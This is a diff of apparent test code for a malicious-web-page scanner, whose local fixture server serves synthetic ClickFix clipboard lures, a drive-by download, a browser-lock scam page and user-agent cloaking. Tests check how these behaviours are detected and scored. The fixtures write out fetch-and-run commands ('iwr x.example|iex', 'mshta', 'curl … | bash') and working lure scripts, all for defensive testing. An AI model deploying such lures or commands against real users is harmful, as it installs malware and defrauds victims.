@@ -1,6 +1,7 @@
 import os
 import asyncio
 import base64
+import json
 
 import pytest
 
@@ -248,6 +249,12 @@ def local_site():
                 "/imgr": "/img",
                 "/to-internal": f"http://localhost:{port}/target",
             }
+            iphone = "iPhone" in (self.headers.get("User-Agent") or "")
+            if self.path == "/cloak-302" and iphone:  # phones sent to another site, harmless there
+                self.send_response(302)
+                self.send_header("Location", f"http://localhost:{port}/target")
+                self.end_headers()
+                return
             if self.path in redirects:
                 self.send_response(302)
                 self.send_header("Location", redirects[self.path])
@@ -264,6 +271,12 @@ def local_site():
             if self.path == "/ok-ws":  # an allowed WebSocket upgrade: arriving is the point
                 self.send_response(400)
                 self.end_headers()
+                return
+            if self.path == "/evil.js":  # an injected script carrying the synthetic skimmer marker
+                self.send_response(200)
+                self.send_header("Content-Type", "text/javascript")
+                self.end_headers()
+                self.wfile.write(b"var PNAKOTIC_TEST_SKIMMER = 1;")
                 return
             if self.path == "/sw.js":
                 self.send_response(200)
@@ -298,6 +311,41 @@ def local_site():
                 self.wfile.write(b"<html><body>ok<script>atob('aGVsbG8=')</script><img src='/slow'></body></html>")
             elif self.path == "/with-pixel":
                 self.wfile.write(b"<html><body>page<img src='/imgr'></body></html>")
+            elif self.path == "/cloak" and iphone:  # phones steered to the scam, everyone else "ok"
+                self.wfile.write(f"<html><script>location='http://localhost:{port}/scam'</script></html>".encode())
+            elif self.path == "/scam":
+                self.wfile.write(b"<html><body>Press Windows Key + R, then CTRL + V and Enter"
+                                 b"<script>atob('aGVsbG8=')</script></body></html>")
+            elif self.path == "/injected":
+                self.wfile.write(b"<html><body>shop<script src='/evil.js'></script></body></html>")
+            elif self.path == "/with-frame":
+                self.wfile.write(b"<html><body>news<iframe src='/ad-frame'></iframe></body></html>")
+            elif self.path == "/ad-frame":
+                self.wfile.write(b"<html><body><script>var PNAKOTIC_TEST_ADFRAME = 1;</script></body></html>")
+            elif self.path == "/clickfix":  # writes on load; real ClickFix waits for a click
+                self.wfile.write(b"<html><body>Verify you are human<script>"
+                                 b"navigator.clipboard.writeText('powershell -w h -c \"iwr x.example|iex\"').catch(function(){});"
+                                 b"</script></body></html>")
+            elif self.path == "/clickfix-exec":  # the hidden-textarea + execCommand('copy') variant
+                self.wfile.write(b"<html><body><script>var t=document.createElement('textarea');"
+                                 b"t.value='mshta https://x.example/v';document.body.appendChild(t);t.select();"
+                                 b"document.execCommand('copy');</script></body></html>")
+            elif self.path == "/drive-by":
+                self.wfile.write(b"<html><body>Your download will start<script>"
+                                 b"var a=document.createElement('a');a.href='/payload.exe';a.download='Update.exe';"
+                                 b"document.body.appendChild(a);a.click();</script></body></html>")
+            elif self.path == "/browser-lock":
+                self.wfile.write(b"<html><body>Windows Defender alert<script>"
+                                 b"window.addEventListener('beforeunload',function(e){e.preventDefault();});"
+                                 b"for(var i=0;i<12;i++){history.pushState({},'','#'+i);}"
+                                 b"document.documentElement.requestFullscreen().catch(function(){});"
+                                 b"alert('Call support');alert('Call support');alert('Call support');"
+                                 b"</script></body></html>")
+            elif self.path == "/hook-probe":  # can the page see that it is being watched?
+                self.wfile.write(b"<html><body><script>document.title=["
+                                 b"Object.getOwnPropertyNames(window).filter(function(k){return /^__[0-9a-f]{16}$/.test(k)}).length,"
+                                 b"Clipboard.prototype.writeText.toString(),Function.prototype.toString.toString()].join('|');"
+                                 b"</script></body></html>")
             else:
                 self.wfile.write(b"<html><body>ok</body></html>")
 
@@ -550,3 +598,460 @@ async def test_analyzer_exception_propagates(local_site, tmp_path):
     engine.analyst.analyze_content = boom
     with pytest.raises(RuntimeError, match="boom"):
         await engine.scan(f"{base}/target")
+
+
+# ---------- landing-page behavior (behavior.py) ----------
+
+def _behaviors(result):
+    from pnakotic.src.scanner.behavior import behavior_events
+    return behavior_events(result.hops)
+
+
+@requires_browser
+@pytest.mark.asyncio
+@pytest.mark.parametrize("path, via", [("/clickfix", "writeText"), ("/clickfix-exec", "execCommand")])
+async def test_clipboard_command_is_decisive(local_site, tmp_path, path, via):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}{path}")
+    writes = [e for e in _behaviors(result) if e["id"] == "clipboard_write"]
+    assert writes and writes[0]["via"] == via and writes[0]["command"] is True
+    assert result.malicious_score == 1.0
+    assert result.metadata["decisive_findings"][0].startswith("Decisive: page wrote a shell command")
+    assert result.is_redirect_chain_detected is False  # behavior hops are not redirects
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_drive_by_download_is_recorded_and_cancelled(local_site, tmp_path):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/drive-by")
+    downloads = [e for e in _behaviors(result) if e["id"] == "download"]
+    assert downloads and downloads[0]["filename"] == "Update.exe" and downloads[0]["executable"] is True
+    assert result.malicious_score == 1.0
+    assert not list(tmp_path.rglob("Update.exe"))  # never kept
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_browser_lock_is_decisive_and_dialogs_dismissed(local_site, tmp_path):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/browser-lock")
+    ids = {e["id"] for e in _behaviors(result)}
+    assert {"beforeunload_trap", "history_flood", "fullscreen_request", "dialog", "dialog_flood"} <= ids
+    assert result.malicious_score == 1.0
+    assert any("browser-lock pattern" in f for f in result.metadata["decisive_findings"])
+    assert result.metadata.get("raw_error") is None  # the dialogs did not hang the page
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_plain_page_has_no_behaviors(local_site, tmp_path):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/target")
+    assert _behaviors(result) == []
+    assert result.metadata["decisive_findings"] == []
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_hooks_are_not_visible_to_the_page(local_site):
+    from playwright.async_api import async_playwright
+    from pnakotic.src.scanner.behavior import BehaviorRecorder
+
+    base, _ = local_site
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        try:
+            ctx = await browser.new_context()
+            await BehaviorRecorder().attach(ctx)
+            page = await ctx.new_page()
+            await page.goto(f"{base}/hook-probe")
+            leaked, write_text, to_string = (await page.title()).split("|")
+        finally:
+            await browser.close()
+    assert leaked == "0"  # the binding was removed from window
+    assert "[native code]" in write_text and "[native code]" in to_string
+
+
+def test_behavior_recorder_bounds_page_input():
+    from pnakotic.src.scanner.behavior import MAX_EVENTS, MAX_PER_ID, MAX_TEXT, BehaviorRecorder
+
+    rec = BehaviorRecorder()
+    rec._on_page_event({}, {"id": "not_a_behavior"})
+    rec._on_page_event({}, "not a dict")
+    assert rec.events == []
+    for _ in range(MAX_PER_ID + 5):
+        rec._on_page_event({}, {"id": "clipboard_write", "text": "x" * (MAX_TEXT * 3)})
+    assert len(rec.events) == MAX_PER_ID
+    assert len(rec.events[0]["text"]) == MAX_TEXT
+    for event_id in ("fullscreen_request", "keyboard_lock", "notification_request", "beforeunload_trap",
+                     "history_flood", "window_open") * MAX_PER_ID:
+        rec._on_page_event({}, {"id": event_id})
+    assert len(rec.events) <= MAX_EVENTS
+
+
+def test_clipboard_command_patterns():
+    from pnakotic.src.scanner.behavior import is_command, is_executable
+
+    for text in ("powershell -w h -c iex(iwr x)", "cmd /c start x", "mshta https://x/y",
+                 "curl -s https://x/i | bash", "echo aGk= | base64 -d | sh", "conhost --headless pwsh"):
+        assert is_command(text), text
+    for text in ("", "hello world", "https://example.com/page", "Ctrl+V to paste your code: 123456"):
+        assert not is_command(text), text
+    assert is_executable("Update.EXE") and is_executable("setup.msi") and is_executable("x.apk")
+    assert not is_executable("report.pdf") and not is_executable("noext")
+
+
+def _behavior_hop(**event):
+    import json
+    from pnakotic.src.scanner.models import RedirectHop
+    return RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence=json.dumps(event))
+
+
+def test_scoring_behavior_support_weights():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    result.hops = [
+        _behavior_hop(id="clipboard_write", text="hello", command=False),
+        _behavior_hop(id="clipboard_write", text="again", command=False),  # counted once
+        _behavior_hop(id="notification_request"),
+        _behavior_hop(id="fullscreen_request"),  # one lock behavior: supporting, not decisive
+    ]
+    score = PnakoticScorer().score(result)
+    assert score == pytest.approx(0.15 + 0.2 + 0.15)
+    assert result.metadata["decisive_findings"] == []
+
+
+def test_scoring_lone_beforeunload_is_not_weighted():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    result.hops = [_behavior_hop(id="beforeunload_trap", via="addEventListener")]
+    assert PnakoticScorer().score(result) == 0.0 and result.metadata["scoring_findings"] == []
+    result.hops.append(_behavior_hop(id="history_flood", calls=10))  # with a second lock behavior: decisive
+    assert PnakoticScorer().score(result) == 1.0
+
+
+def test_scoring_decisive_overrides_weights():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    result.hops = [_behavior_hop(id="download", filename="invoice.zip", executable=False)]
+    assert PnakoticScorer().score(result) == pytest.approx(0.4)  # archive: supporting only
+
+    result.hops.append(_behavior_hop(id="download", filename="Setup.msi", executable=True))
+    assert PnakoticScorer().score(result) == 1.0
+    assert result.metadata["scoring_findings"][0].startswith("Decisive: download of Setup.msi")
+
+
+def test_scoring_ignores_malformed_behavior_evidence():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+
+    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    result.hops = [RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="not json"),
+                   RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="[1, 2]")]
+    assert PnakoticScorer().score(result) == 0.0
+
+
+# ---------- cross-profile comparison (cloaking) ----------
+
+def _two_site_engine(tmp_path):
+    """Like _local_engine, but `localhost` is a second allowed site (a different apex)."""
+    engine = _local_engine(tmp_path)
+
+    async def two_sites(host):
+        return host in ("127.0.0.1", "localhost")
+
+    engine.host_allowed = two_sites
+    return engine
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_every_profile_loads_and_cloaking_is_recorded(local_site, tmp_path):
+    # Local pages land on the IP 127.0.0.1, which scores ip_landing (0.5) everywhere, so the
+    # verdict rules are tested offline below; this checks the mechanics end to end.
+    base, _ = local_site
+    result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "default", compare=True)
+    cloaking = result.metadata["cloaking"]
+    assert cloaking["landings"] == {"default": "127.0.0.1", "mobile-ios": "localhost",
+                                    "mobile-android": "127.0.0.1", "search-clicker": "127.0.0.1"}
+    assert cloaking["common"] == "127.0.0.1" and cloaking["steered"] == ["mobile-ios"]
+    ios = next(v for v in result.metadata["variants"] if v["profile"] == "mobile-ios")
+    assert ios["final_url"].endswith("/scam") and ios["raw_error"] is None and ios["redirects"] == 1
+    assert any(f.startswith("[mobile-ios] ClickFix lure text") for f in result.metadata["scoring_findings"])
+    # the job's own chain is still the requested (desktop) profile's
+    assert result.is_redirect_chain_detected is False
+    shots = [a["rel_path"] for a in result.metadata["artifact_manifest"]["artifacts"]]
+    assert sum(r.startswith("screenshots/") for r in shots) == 1  # the dashboard's landing shot
+    assert {r.split("/")[1] for r in shots if r.startswith("profiles/")} == {"mobile-ios", "mobile-android", "search-clicker"}
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_without_compare_only_the_requested_profile_runs(local_site, tmp_path):
+    base, hits = local_site
+    before = len(hits)
+    result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "mobile-ios")
+    assert "variants" not in result.metadata and "cloaking" not in result.metadata
+    assert result.final_url.endswith("/scam")
+    assert [h for h in hits[before:] if h[1] == "/cloak"] == [("127.0.0.1", "/cloak")]
+
+
+def _landed(url, **metadata):
+    from pnakotic.src.scanner.models import ScanResult
+    r = ScanResult(target_url="https://ads.example/c", final_url=url)
+    r.metadata.update(metadata)
+    return r
+
+
+def _scored(*results):
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    for r in results:
+        PnakoticScorer().score(r)
+    return results
+
+
+def test_cloaking_onto_a_suspicious_page_is_decisive():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+
+    desktop, ios, android = _scored(_landed("https://www.shop.example/"), _landed("https://win-alert.xyz/"),
+                                    _landed("https://www.shop.example/"))
+    assert ios.malicious_score == pytest.approx(0.3)  # suspicious TLD only: not suspicious enough alone
+    ios.hops = [_behavior_hop(id="notification_request"), _behavior_hop(id="window_open")]
+    PnakoticScorer().score(ios)
+    assert ios.malicious_score >= 0.4
+    assert PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android}) == 1.0
+    assert desktop.metadata["cloaking"]["steered"] == ["mobile-ios"]
+    assert desktop.metadata["decisive_findings"][0].startswith("Decisive: cloaking")
+
+
+def test_cloaking_with_a_bot_fallback_is_decisive():
+    # most profiles get the scam; the bot-like desktop is sent to google.com
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+
+    desktop, ios, android = _scored(_landed("https://www.google.com/"), _landed("https://10.20.30.40/"),
+                                    _landed("https://10.20.30.40/"))
+    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android})
+    assert desktop.metadata["cloaking"]["common"] == "10.20.30.40"
+    assert desktop.metadata["cloaking"]["suspicious"] == ["mobile-android", "mobile-ios"]
+    assert desktop.malicious_score == 1.0
+
+
+def test_harmless_profile_split_is_supporting_only():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+
+    desktop, ios = _scored(_landed("https://www.shop.example/"), _landed("https://apps.apple.com/app/shop"))
+    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
+    assert desktop.metadata["decisive_findings"] == []
+    assert desktop.malicious_score == pytest.approx(0.35)
+    assert desktop.metadata["scoring_findings"][0].startswith("Cloaking: landing depends on the browser profile")
+
+
+def test_same_landing_everywhere_is_not_cloaking():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+
+    desktop, ios = _scored(_landed("https://www.shop.example/"), _landed("https://m.shop.example/"))
+    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
+    assert desktop.metadata["cloaking"] is None and desktop.malicious_score == 0.0
+
+
+def test_combine_takes_the_worst_profile_and_prefixes_its_findings():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    scorer = PnakoticScorer()
+    primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    scorer.score(primary)
+    ios = ScanResult(target_url="https://x.example/", final_url="https://x.example/a")
+    ios.hops = [_behavior_hop(id="download", filename="Setup.exe", executable=True)]
+    scorer.score(ios)
+    assert scorer.combine(primary, "default", {"mobile-ios": ios, "mobile-android": "net::ERR_FAILED"}) == 1.0
+    assert primary.metadata["cloaking"] is None  # same apex: not cloaking, but the payload still counts
+    assert primary.metadata["decisive_findings"] == ["[mobile-ios] Decisive: download of Setup.exe started without a click"]
+    variants = primary.metadata["variants"]
+    assert variants[0]["profile"] == "default" and variants[0]["requested"] is True
+    assert variants[0]["malicious_score"] == 0.0  # its own score, not the job's
+    assert variants[2] == {"profile": "mobile-android", "error": "net::ERR_FAILED"}
+
+
+def test_combine_ignores_profiles_whose_page_never_loaded():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    scorer = PnakoticScorer()
+    primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    scorer.score(primary)
+    failed = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    failed.metadata["raw_error"] = "net::ERR_CONNECTION_RESET"
+    other = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+    for r in (failed, other):
+        scorer.score(r)
+    scorer.combine(primary, "default", {"mobile-ios": failed, "mobile-android": other})
+    assert primary.metadata["cloaking"] is None
+
+
+# ---------- YARA over the page, its frames and its scripts (yara_scan.py) ----------
+# Synthetic rules only: the real rule sets are private and live outside this repository.
+
+def _yara_available() -> bool:
+    try:
+        import yara  # noqa: F401
+        return True
+    except ImportError:
+        return False
+
+
+requires_yara = pytest.mark.skipif(not _yara_available(), reason="yara-python not installed")
+
+_RULE = """rule {name} : {tag} {{
+  meta:
+    signatureId = {sid}
+    production = {production}
+    severity = {severity}
+    description = "{description}"
+    targetLanguage = "raw"
+  strings:
+    $a = "{marker}"
+  condition:
+    $a and filename != "ignore-me"
+}}
+"""
+
+
+def _rules_dir(tmp_path):
+    """A rules tree split by target: html/ and raw/js_* are used, raw/php_* and php/ are not."""
+    root = tmp_path / "YARA"
+    for sub in ("html", "raw", "php"):
+        (root / sub).mkdir(parents=True)
+
+    def rule(path, name, marker, severity, production=True):
+        tag = "production" if production else "exploratory"
+        path.write_text(_RULE.format(name=name, tag=tag, sid=42000000 + len(name), severity=severity,
+                                     production=str(production).lower(), marker=marker,
+                                     description=f"Synthetic {name}"))
+
+    rule(root / "raw" / "js_skimmer_test_001.yara", "js_skimmer_test_001", "PNAKOTIC_TEST_SKIMMER", 5)
+    rule(root / "html" / "html_adframe_test_001.yara", "html_adframe_test_001", "PNAKOTIC_TEST_ADFRAME", 4,
+         production=False)
+    rule(root / "raw" / "php_ignored_test_001.yara", "php_ignored_test_001", "shop", 5)
+    rule(root / "php" / "php_backdoor_test_001.yara", "php_backdoor_test_001", "news", 5)
+    (root / "raw" / "js_broken_test_001.yara").write_text("rule js_broken_test_001 { condition: nope(")
+    return root
+
+
+@pytest.fixture
+def yara_rules_dir(tmp_path, monkeypatch):
+    root = _rules_dir(tmp_path)
+    monkeypatch.setenv("YARA_RULES_DIR", str(root))
+    return root
+
+
+@requires_yara
+def test_yara_rule_selection_and_broken_files(yara_rules_dir):
+    from pnakotic.src.scanner.yara_scan import _rule_files, load_rules
+
+    names = sorted(pathlib_name(f) for f in _rule_files(str(yara_rules_dir)))
+    assert names == ["html_adframe_test_001.yara", "js_broken_test_001.yara", "js_skimmer_test_001.yara"]
+    rules = load_rules()
+    assert rules.count == 2 and len(rules.skipped) == 1 and rules.skipped[0].startswith("js_broken_test_001")
+    assert load_rules() is rules  # compiled once per process
+
+
+def pathlib_name(path):
+    import os
+    return os.path.basename(path)
+
+
+def test_yara_is_off_without_rules_dir(monkeypatch, tmp_path):
+    from pnakotic.src.scanner.yara_scan import load_rules
+
+    monkeypatch.delenv("YARA_RULES_DIR", raising=False)
+    assert load_rules() is None
+    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path / "missing"))
+    assert load_rules() is None
+
+
+@requires_yara
+@pytest.mark.asyncio
+async def test_yara_bounds_and_dedupes(yara_rules_dir, monkeypatch):
+    from pnakotic.src.scanner import yara_scan
+
+    rules = yara_scan.load_rules()
+    marker = b"PNAKOTIC_TEST_SKIMMER"
+    buffers = [("script", f"http://x.example/{i}.js", marker) for i in range(3)]
+    buffers.append(("script", "http://x.example/big.js", b"x" * (yara_scan.MAX_BUFFER_BYTES + 10) + marker))
+    found, stats = await yara_scan.scan_buffers(rules, buffers)
+    assert len(found) == 1 and found[0]["hits"] == 3  # the marker past the size cap is not seen
+    assert found[0]["url"] == "http://x.example/0.js" and found[0]["snippet"] == "PNAKOTIC_TEST_SKIMMER"
+    assert stats["buffers"] == 4 and stats["bytes"] <= 3 * len(marker) + yara_scan.MAX_BUFFER_BYTES
+    monkeypatch.setattr(yara_scan, "SCAN_BUDGET_S", -1.0)
+    _, stats = await yara_scan.scan_buffers(rules, buffers)
+    assert stats["budget_exhausted"] is True and stats["buffers"] == 0
+
+
+@requires_yara
+@pytest.mark.asyncio
+async def test_yara_filename_external_gets_an_extension(tmp_path, monkeypatch):
+    from pnakotic.src.scanner import yara_scan
+
+    (tmp_path / "r").mkdir()
+    (tmp_path / "r" / "js_ext_test_001.yara").write_text(
+        'rule js_ext_test_001 { strings: $a = "MARK" condition: $a and filename matches /\\.js$/ }')
+    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path / "r"))
+    rules = yara_scan.load_rules()
+    found, _ = await yara_scan.scan_buffers(rules, [("script", "https://cdn.example/t/collect?v=1#x", b"MARK")])
+    assert [f["rule"] for f in found] == ["js_ext_test_001"]  # extensionless URL still named *.js
+
+
+@requires_browser
+@requires_yara
+@pytest.mark.asyncio
+async def test_yara_matches_a_loaded_script(local_site, tmp_path, yara_rules_dir):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/injected")
+    hits = [json.loads(h.evidence) for h in result.hops if h.mechanism == "yara_match"]
+    assert [(h["rule"], h["source"]) for h in hits] == [("js_skimmer_test_001", "script")]
+    assert hits[0]["url"].endswith("/evil.js") and hits[0]["production"] is True and hits[0]["severity"] == 5
+    assert result.malicious_score == 1.0
+    assert result.metadata["decisive_findings"][0].startswith("Decisive: known malicious code, YARA js_skimmer_test_001")
+    assert result.metadata["yara"]["rules"] == 2 and result.metadata["yara"]["buffers"] >= 2
+
+
+@requires_browser
+@requires_yara
+@pytest.mark.asyncio
+async def test_yara_matches_an_ad_frame_without_deciding(local_site, tmp_path, yara_rules_dir):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/with-frame")
+    hits = [json.loads(h.evidence) for h in result.hops if h.mechanism == "yara_match"]
+    assert [(h["rule"], h["source"]) for h in hits] == [("html_adframe_test_001", "frame")]
+    assert result.metadata["decisive_findings"] == []  # exploratory: strong support, never decisive
+    assert any(f.startswith("YARA html_adframe_test_001 (exploratory, severity 4)") for f in result.metadata["scoring_findings"])
+
+
+def test_scoring_yara_tiers():
+    import json as _json
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+
+    def hit(rule, severity, production):
+        return RedirectHop(url="https://x.example/a.js", mechanism="yara_match", evidence=_json.dumps(
+            {"id": "yara_match", "rule": rule, "severity": severity, "production": production,
+             "source": "script", "url": "https://x.example/a.js", "description": "d"}))
+
+    def score(*hops):
+        r = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
+        r.hops = list(hops)
+        return PnakoticScorer().score(r), r
+
+    assert score(hit("a", 2, True), hit("b", 1, False))[0] == pytest.approx(0.15)  # weak, once
+    assert score(hit("a", 5, False), hit("b", 3, True))[0] == pytest.approx(0.4)   # strong, once
+    assert score(hit("a", 5, False), hit("b", 2, False))[0] == pytest.approx(0.55)
+    total, r = score(hit("a", 4, True))
+    assert total == 1.0 and r.metadata["decisive_findings"][0].startswith("Decisive: known malicious code, YARA a")
